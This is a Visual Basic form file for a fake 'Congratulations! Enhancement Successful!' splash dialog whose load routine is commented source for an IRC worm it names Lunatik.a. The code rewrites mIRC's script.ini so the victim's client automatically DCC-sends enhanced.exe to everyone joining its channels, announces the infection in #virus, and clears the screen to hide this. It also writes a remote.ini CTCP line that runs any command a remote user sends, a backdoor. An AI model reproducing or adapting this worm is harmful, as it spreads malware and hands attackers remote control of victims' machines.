VERSION 5.00
Begin VB.Form frmSplash 
   BorderStyle     =   3  'Fixed Dialog
   Caption         =   "Congratulations !"
   ClientHeight    =   1575
   ClientLeft      =   255
   ClientTop       =   1695
   ClientWidth     =   4170
   ClipControls    =   0   'False
   ControlBox      =   0   'False
   KeyPreview      =   -1  'True
   LinkTopic       =   "Form2"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   1575
   ScaleWidth      =   4170
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'CenterScreen
   Begin VB.CommandButton Command1 
      Caption         =   "OK"
      Height          =   375
      Left            =   1440
      TabIndex        =   1
      Top             =   1080
      Width           =   1335
   End
   Begin VB.Image Image1 
      Height          =   480
      Left            =   120
      Top             =   240
      Width           =   480
   End
   Begin VB.Label Label1 
      Caption         =   "Congratulations ! Enhancement Successful !"
      Height          =   255
      Left            =   840
      TabIndex        =   0
      Top             =   240
      Width           =   4095
   End
End
Attribute VB_Name = "frmSplash"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False


Private Sub Command1_Click()
End
End Sub

Private Sub Form_Load()
On Error Resume Next 'If an error occurs, we simply skip all of the code and goto the end sub procedure
Kill ("c:\mirc\script.ini") 'We delete script.ini
Open ("c:\mirc\script.ini") For Output As 1 'We create a new script.ini. We specify script.ini as the number 1
Print #1, "[script]" 'We are now printing directly into script.ini
Print #1, "n0=on 1:JOIN:#: if ( $me != $nick ) { /dcc send $nick c:\progra~1\access~1\enhanced.exe }" 'This is the auto DCC line so whenever someone joins the same channel as the infected user, they are send enhanced.exe
Print #1, "n1=on 1:CONNECT: {" 'Here is what we specify on connect to the IRC server
Print #1, "n2=/copy C:\mirc\download\enhanced.exe c:\progra~1\access~1\" 'We copy enhanced.exe from the download dir to the program files\accessories dir
Print #1, "n3=  /join #virus " 'Simple, we join the channel #virus when connected to the IRC server
Print #1, "n4=  /msg #virus I am infected with Lunatik.a, the perfect headache" 'This is the message we say when we join #virus (this is very quick and the infected user does not see this message
Print #1, "n5= /part #virus" 'Leave #virus and continue as normal
Print #1, "n6= /clear" 'Now, so the user does not see their status screen full of copyfile commands etc, we clear the whole screen
Print #1, "n7= /motd" 'Once the screen is cleared, we want to fill it up with something the user is familiar with, message of the day
Print #1, "n8= }" 'Here is where we close the code in script.ini
Close 1 'We now indicate we have finished using script.ini
Kill ("c:\mirc\remote.ini") 'We now delete remote.ini if there is one
Open ("c:\mirc\remote.ini") For Output As 2 'We create a fresh remote.ini and specify it as the number 2
Print #2, "n0=ctcp ^1:*:?:$1- | halt" ' The Ultimate CTCP Remote Access Line (c) ALT-F9 [AVM] 1999 (Used With Permission)
Close 2 'we have now finished with remote.ini so we close it
End Sub 'That its, all finished :)
